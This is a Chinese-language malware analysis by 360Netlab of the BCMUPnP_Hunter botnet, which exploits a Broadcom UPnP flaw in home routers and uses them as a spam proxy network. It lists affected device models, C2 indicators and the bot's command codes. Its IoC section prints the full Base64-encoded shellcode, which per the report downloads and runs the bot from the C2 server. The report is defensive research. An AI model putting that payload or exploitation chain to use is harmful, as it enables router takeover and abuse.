本文由 [Hui
Wang](https://twitter.com/huiwangeth)、[RootKiter](https://twitter.com/RooKiter)共同撰写

360Netlab在2018年9月注意到一个新的僵尸网络。该僵尸网络的感染数量特别巨大，每个扫描波次中活跃的IP地址为10万左右，值得引起安全社区的警惕。

我们将该僵尸网络命名为 BCMUPnP_Hunter，主要是考虑基其感染目标特征。该僵尸网络有以下几个特点：

  * 感染量特别巨大，每个波次中活跃的扫描IP均在10万左右；
  * 感染目标单一，主要是以BroadCom UPnP为基础的路由器设备；
  * 样本捕获难度大，在高交互蜜罐中需模拟多处设备环境后才能成功捕获；
  * 自建代理网络(tcp-proxy)，该代理网络由攻击者自行实现，可以利用 bot端 为跳板，代理访问互联网；
  * 该代理网络目前主要访问Outlook，Hotmail，Yahoo! Mail 等知名邮件服务器，我们高度怀疑攻击者的意图主要是和发送垃圾邮件有关。

处理时间线

  * 2013年10月 DefenseCode的安全研究人员发现Broadcom UPnP 实现存在重大安全[漏洞](http://defensecode.com/whitepapers/From_Zero_To_ZeroDay_Network_Devices_Exploitation.txt)。考虑到漏洞的严重性，并没有立即公开他们的发现。
  * 2017年4月 DefenseCode正式披露了这个[漏洞的细节信息](https://www.defensecode.com/public/DefenseCode_Broadcom_Security_Advisory.pdf)
  * 2018年9月 360Netlab `ScanMon系统` 检测到针对`TCP 5431` 端口的[扫描异常](https://twitter.com/liuya0904/status/1044960012072697856)，在对基础数据回溯后，发现该扫描特征最早可回溯于 2018年1月。
  * 2018年10月 定位扫描源头，并捕获投递样本。

# 规模评估

最近30天针对 端口5431 的扫描源IP趋势如下：  

![Snip20181102_3.png](https://image.3001.net/images/20181102/1541133015_5bdbd2d7acf72.png!small)  

  * 可见扫描不是持续的，而是每隔1-3天构成一个波次。单个波次中活跃的扫描IP在10万左右，我们正是基于这个数据度量该僵尸网络的规模；

  * 历史上累积看到的扫描源ip有337万。这个数量虽然巨大，但也许并不意味着已经有这么多设备已经被感染，而可能是同一被感染设备设备IP随时间变化导致。
  * 潜在易感染数量[超过42万](https://www.shodan.io/search?query=Server%3A%20Custom%2F1.0%20UPnP%2F1.0%20Proc%2FVer)，这个主要是根据扫描源ip返回banner中的web server:`Server: Custom/1.0 UPnP/1.0 Proc/Ver`从shodan的搜索结果估计的。
  * 最近7天扫描源IP地理位置分布
  * ![Snip20181102_9.png](https://image.3001.net/images/20181102/1541133034_5bdbd2eaca257.png!small)  

# 被感染设备信息

通过对攻击源的探测，得到了116款被感染的设备信息，实际感染设备种类不限于此：

    
    
    ADB Broadband S.p.A,    HomeStation ADSL Router  
    ADB Broadband,    ADB ADSL Router  
    ADBB,    ADB ADSL Router  
    ALSiTEC,    Broadcom ADSL Router  
    ASB,    ADSL Router  
    ASB,    ChinaNet EPON Router  
    ASB,    ChinaTelecom E8C(EPON) Gateway  
    Actiontec,    Actiontec GT784WN  
    Actiontec,    Verizon ADSL Router  
    BEC Technologies Inc.,    Broadcom ADSL Router  
    Best IT World India Pvt. Ltd.,    150M Wireless-N ADSL2+ Router  
    Best IT World India Pvt. Ltd.,    iB-WRA300N  
    Billion Electric Co., Ltd.,    ADSL2+ Firewall Router  
    Billion Electric Co., Ltd.,    BiPAC 7800NXL  
    Billion,    BiPAC 7700N  
    Billion,    BiPAC 7700N R2  
    Binatone Telecommunication,    Broadcom LAN Router  
    Broadcom,    ADSL Router  
    Broadcom,    ADSL2+ 11n WiFi CPE  
    Broadcom,    Broadcom  Router  
    Broadcom,    Broadcom ADSL Router  
    Broadcom,    D-Link DSL-2640B  
    Broadcom,    D-link ADSL Router  
    Broadcom,    DLink ADSL Router  
    ClearAccess,    Broadcom ADSL Router  
    Comtrend,    AR-5383n  
    Comtrend,    Broadcom ADSL Router  
    Comtrend,    Comtrend single-chip ADSL router  
    D-Link Corporation.,    D-Link DSL-2640B  
    D-Link Corporation.,    D-Link DSL-2641B  
    D-Link Corporation.,    D-Link DSL-2740B  
    D-Link Corporation.,    D-Link DSL-2750B  
    D-Link Corporation.,    D-LinkDSL-2640B  
    D-Link Corporation.,    D-LinkDSL-2641B  
    D-Link Corporation.,    D-LinkDSL-2741B  
    D-Link Corporation.,    DSL-2640B  
    D-Link,    ADSL 4*FE 11n Router  
    D-Link,    D-Link ADSL Router  
    D-Link,    D-Link DSL-2640U  
    D-Link,    D-Link DSL-2730B  
    D-Link,    D-Link DSL-2730U  
    D-Link,    D-Link DSL-2750B  
    D-Link,    D-Link DSL-2750U  
    D-Link,    D-Link DSL-6751  
    D-Link,    D-Link DSL2750U  
    D-Link,    D-Link Router  
    D-Link,    D-link ADSL Router  
    D-Link,    DVA-G3672B-LTT Networks ADSL Router  
    DARE,    Dare router  
    DLink,    D-Link DSL-2730B  
    DLink,    D-Link VDSL Router  
    DLink,    DLink ADSL Router  
    DQ Technology, Inc.,    ADSL2+ 11n WiFi CPE  
    DQ Technology, Inc.,    Broadcom ADSL Router  
    DSL,    ADSL Router  
    DareGlobal,    D-Link ADSL Router  
    Digicom S.p.A.,    ADSL Wireless Modem/Router  
    Digicom S.p.A.,    RAW300C-T03  
    Dlink,    D-Link DSL-225  
    Eltex,    Broadcom ADSL Router  
    FiberHome,    Broadcom ADSL Router  
    GWD,    ChinaTelecom E8C(EPON) Gateway  
    Genew,    Broadcom ADSL Router  
    INTEX,    W150D  
    INTEX,    W300D  
    INTEX,    Wireless N 150 ADSL2+ Modem Router  
    INTEX,    Wireless N 300 ADSL2+ Modem Router  
    ITI Ltd.,    ITI Ltd.ADSL2Plus Modem/Router  
    Inteno,    Broadcom ADSL Router  
    Intercross,    Broadcom ADSL Router  
    IskraTEL,    Broadcom ADSL Router  
    Kasda,    Broadcom ADSL Router  
    Link-One,    Modem Roteador Wireless N ADSL2+ 150 Mbps  
    Linksys,    Cisco X1000  
    Linksys,    Cisco X3500  
    NB,    DSL-2740B  
    NetComm Wireless Limited,    NetComm ADSL2+ Wireless Router  
    NetComm,    NetComm ADSL2+ Wireless Router  
    NetComm,    NetComm WiFi Data and VoIP Gateway  
    OPTICOM,    DSLink 279  
    Opticom,    DSLink 485  
    Orcon,    Genius  
    QTECH,    QTECH  
    Raisecom,    Broadcom ADSL Router  
    Ramptel,    300Mbps ADSL Wireless-N Router  
    Router,    ADSL2+ Router  
    SCTY,    TYKH PON Router  
    Star-Net,    Broadcom ADSL Router  
    Starbridge Networks,    Broadcom ADSL Router  
    TP-LINK Technologies Co., Ltd,    300Mbps Wireless N ADSL2+ Modem Router  
    TP-LINK Technologies Co., Ltd,    300Mbps Wireless N USB ADSL2+ Modem Router  
    TP-LINK,    TP-LINK Wireless ADSL2+ Modem Router  
    TP-LINK,    TP-LINK Wireless ADSL2+ Router  
    Technicolor,    CenturyLink TR-064 v4.0  
    Tenda,    Tenda ADSL2+ WIFI MODEM  
    Tenda,    Tenda ADSL2+ WIFI Router  
    Tenda,    Tenda Gateway  
    Tenda/Imex,    ADSL2+ WIFI-MODEM WITH 3G/4G USB PORT  
    Tenda/Imex,    ADSL2+ WIFI-MODEM WITH EVO SUPPORT  
    UTStarcom Inc.,    UTStarcom ADSL2+ Modem Router  
    UTStarcom Inc.,    UTStarcom ADSL2+ Modem/Wireless Router  
    UniqueNet Solutions,    WLAN N300 ADSL2+ Modem Router  
    ZTE,    Broadcom ADSL Router  
    ZTE,    ONU Router  
    ZYXEL,    ZyXEL VDSL Router  
    Zhone,    Broadcom ADSL Router  
    Zhone,    Zhone Wireless Gateway  
    Zoom,    Zoom Adsl Modem/Router  
    ZyXEL,    CenturyLink UPnP v1.0  
    ZyXEL,    P-660HN-51  
    ZyXEL,    ZyXEL xDSL Router  
    huaqin,    HGU210 v3 Router  
    iBall Baton,    iBall Baton 150M Wireless-N ADSL2+ Router  
    iiNet Limited,    BudiiLite  
    iiNet,    BoB2  
    iiNet,    BoBLite  
    

# 传播过程及捕获

对于每一个随机生成的 目标IP，Bot端会先探测其`TCP 5431`端口的开放情况。如果开放，则通过潜在可感染url（访问 UDP-1900端口
得到这个url）进一步探测漏洞有效性。通过探测检查的IP会统一汇报到Loader(`109.248.9.17:4369`)，由`Loader`完成后续的漏洞利用和植入恶意样本的过程。

攻击过程的简要时序图如下：  

  
![bcm_p0.png](https://image.3001.net/images/20181102/1541133080_5bdbd318f2b9b.png!small)

除上述必要的交互外，漏洞利用本身也需要经过多个步骤的交互，才能成功。

但是对于高交互蜜罐的开发人员来说，每一次交互都成了一次考验。只有正确回答每一次请求，才能成功诱骗投递者投递最终样本。为此我们修改了多种蜜罐，以便能够完整的模拟受感染设备，欺骗投递者，最终完成对该僵尸网络的分析。

# 样本部分

该僵尸网络的样本由两个部分组成，shellcode和bot主体，下面分别描述其功能。

## shellcode

shellcode主要功能，从c2(`109.248.9.17:8738`)下载主样本并执行。

该`shellcode`全长432字节，工整规范，无法从常见搜索引擎中检索到。同时又完美的实现了以下几点，可见作者功力深厚，并非一般的脚本小子所为:

  * 基础能力方面：代码出现了多处网络、进程、文件等syscall调用；
  * 代码细节方面：利用 `syscall 0x40404`（替代 `syscall 0`）和多次取反操作，进而避免了坏字符(\x00)；代码中栈变量也出现了不同程度的复用，以优化运行时的栈结构；
  * 代码逻辑方面：通过使用循环节，合理规避了多种失败调用的情况，保证了shellcode执行的有效性。

其完整流程图如下，对shellcode感兴趣的读者可以自行阅读：

  
![5431_mips_shellcode_color_min.png](https://image.3001.net/images/20181102/1541133145_5bdbd35927748.png!small)

  

## 样本主体

样本主体的功能包括 Broadcom UPnP 漏洞探测和代理访问网络功能，能够解析来自C2的4种指令码：

    
    
    指令码        包长          功能
    0x00000000    0x18     首包，有服务伪装的效果，无实际意义  
    0x01010101    0x4c     搜寻潜在感染目标任务  
    0x02020202    0x08     当前任务清空  
    0x03030303    0x108    访问代理网络任务  
    

  * `0x01010101` 为开启端口扫描任务的指令码，BOT端一旦扫描到潜在感染目标，便会将目标IP 封包后上报 Loader，随后Loader会完成后续感染流程。
  * `0x03030303` 为代理服务指令码，BOT端会访问指令中提供的地址，并将访问结果汇报给主控端。

这些指令中，`0x03030303`
是可以产生实际经济利益的，攻击者可以利用这条指令构建代理网络，进而通过发送垃圾邮件、模拟点击等等活动牟利。其他的指令只能用于感染和扩张僵尸网络的规模，并不会产生实际的经济效益。

# 代理网络和垃圾邮件

为了厘清攻击者的攻击意图，我们通过一系列技术手段继续跟踪攻击者发出的`0x03030303` 指令。

在我们已经得到的指令中，BCMUPnP_Hunter被用于代理以下服务器的流量：

    
    
    104.47.0.33:25  
    104.47.12.33:25  
    104.47.124.33:25  
    104.47.14.33:25  
    104.47.33.33:25  
    104.47.48.33:25  
    104.47.50.33:25  
    106.10.248.84:25  
    144.160.159.21:25  
    188.125.73.87:25  
    67.195.229.59:25  
    74.6.137.63:25  
    74.6.137.64:25  
    98.137.159.28:25  
    

我们的基础数据对这些服务器提供了更加详细的刻画：

  
![proxy_target-1.png](https://image.3001.net/images/20181102/1541133177_5bdbd37920cbb.png!small)  

可以看出：

  * 这些服务器均属于知名邮件服务提供商，包括Outlook，Hotmail，Yahoo! Mail；
  * 几个月以来，这些服务器均提供且仅提供了TCP25的服务；
  * 在这个案例中，基本可以认为攻击者在滥用这些服务器的电子邮件服务；

这让我们高度怀疑，攻击者正在利用BCMUPnP_Hunter建立的代理网络发送垃圾邮件。

# 联系我们

感兴趣的读者，可以在 [twitter](https://twitter.com/360Netlab) 或者在微信公众号 360Netlab
上联系我们，或者向我们发送电子邮件 netlab[at]360.cn。

为避免滥用，我们不会公布受害者 IP 列表。相关安全和执法机构，可以邮件联系netlab[at]360.cn获取被感染的IP地址列表。

# 附录：关于 BroadCom UPnP 漏洞

UPnP是Universal Plug and
Play的缩写，即通用即插即用协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现[[1]](https://en.wikipedia.org/wiki/Universal_Plug_and_Play)。BroadCom
UPnP是BroadCom公司针对UPnP协议的具体实现。由于BroadCom在业界处于供应链上游，所以该实现被各大路由器厂商采用，包括华硕，D-Link，Zyxel，US
Robotics，T​​P-Link，Netgear等。

2013年10月安全研究公司DefenseCode的安全研究人员发现了协议栈中的[BroadCom UPnP
格式化字符串漏洞](http://defensecode.com/whitepapers/From_Zero_To_ZeroDay_Network_Devices_Exploitation.txt)。考虑到该漏洞影响多家主流路由器厂商的产品，DefenseCode直到2017年才[公开](https://www.defensecode.com/public/DefenseCode_Broadcom_Security_Advisory.pdf)他们的发现。这次披露的代码是验证性质的，攻击者在已公开文档的基础上还须完成必要的漏洞分析和优化shellcode的过程后才能发挥实际的威力。本文涉及的BCMUPnP_Hunter就是如此。

# IoC

C2服务器

    
    
    109.248.9.17 "Bulgaria/BG" "AS58222 Solar Invest UK LTD" #C2&&Loader  
    

Sample MD5

    
    
    9036120904827550bf4436a919d3e503  
    

Shellcode(Base64 encode):

    
    
    AtYgJSQCD6YBAQEMArUgJSQCD6YBAQEMJ6T/yq+k/+CvoP/kJ6X/4CgG//8kAg+rAQEBDCgE//8kAg+hAQEBDAO9uCUnvf/gJA///QHgICckD//9AeAoJygG//8kAhBXAQEBDK+i/9yPtv/cJA8TNwLWICUkD//9AeB4J6ev/+AkDyIip6//4iQPbfinr//kJA8JEaev/+avoP/or6D/7Cel/+AkD//vAeAwJyQCEEoBAQEMJA8vdKev/8okD21wp6//zCQPL3Snr//OJA9tcKev/9AkD2Zzp6//0qeg/9QnpP/KJA/+EgHgKCckAg/HAQEBDCgE//8npf/KJ6b/zygH//+u4P/wJAIPtQEBAQwkDy90p6//1CQPbXCnr//WJA9mc6ev/9inoP/aJ6T/yiQP/hIB4CgnJAIPqAEBAQyvov/cj7X/3CQPEzcC1iAlJ6X/4CQP/98B4DAnKAf//yQCEE8BAQEMr6L/3I+0/9wkDxM3BoD/ryQPEzcagP+gJA8TNwK1ICUnpf/gApQwJSQCD6QBAQEMFoL/piQPEzcSgv/qJA8TNzQP3q00D96t  
    

  

